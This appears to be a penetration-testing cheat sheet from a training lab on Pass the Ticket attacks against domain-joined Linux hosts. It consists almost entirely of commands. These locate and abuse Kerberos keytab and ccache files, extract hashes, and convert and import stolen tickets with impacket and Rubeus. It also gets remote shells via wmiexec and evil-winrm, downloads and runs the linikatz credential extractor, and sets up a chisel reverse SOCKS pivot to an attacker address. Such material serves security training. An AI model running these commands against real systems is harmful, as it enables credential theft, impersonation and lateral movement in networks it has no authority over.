# Pass the Ticket - Linux

## Overview
* Linux machines joined to AD store Kerberos tickets in two forms:
  * **ccache files** — typically at `/tmp/krb5cc_*` (env var `KRB5CCNAME`)
  * **keytab files** — `/etc/krb5.keytab` or custom `.keytab` / `.kt` files

## Identify Domain-Joined Linux

```
realm list
ps -ef | grep -i "winbind\|sssd"
```

## Find Keytab Files

```
find / -name *keytab* -ls 2>/dev/null
```

## Find ccache Files

```
env | grep -i krb5
ls -la /tmp
```

## List Keytab Entries

```
klist -k -t /opt/specialfiles/carlos.keytab
```

## Impersonate User with Keytab (kinit)

```
kinit carlos@INLANEFREIGHT.HTB -k -t /opt/specialfiles/carlos.keytab
klist
smbclient //dc01/carlos -k -c ls
```

## Extract Hashes from Keytab (KeyTabExtract)

```
python3 /opt/keytabextract.py /opt/specialfiles/carlos.keytab
```

## Abuse ccache Files (as root)

```
cp /tmp/krb5cc_647401106_I8I133 .
export KRB5CCNAME=/root/krb5cc_647401106_I8I133
klist
smbclient //dc01/C$ -k -c 'ls'
```

## Convert ccache to kirbi

```
impacket-ticketConverter krb5cc_647401106_I8I133 julio.kirbi
```

## Import kirbi on Windows (Rubeus)

```
Rubeus.exe ptt /ticket:c:\tools\julio.kirbi
```

## Impacket with Kerberos + Proxychains

```
proxychains impacket-wmiexec dc01 -k
```

## Evil-WinRM with Kerberos

```
sudo apt-get install krb5-user -y
proxychains evil-winrm -i dc01 -r inlanefreight.htb
```

## Linikatz (Linux Credential Extraction)

```
wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
/opt/linikatz.sh
```

## Chisel + Proxychains Pivot Setup

```
sudo ./chisel server --reverse
```

```
c:\tools\chisel.exe client 10.10.14.33:8080 R:socks
```

```
export KRB5CCNAME=/home/htb-student/krb5cc_647401106_I8I133
```
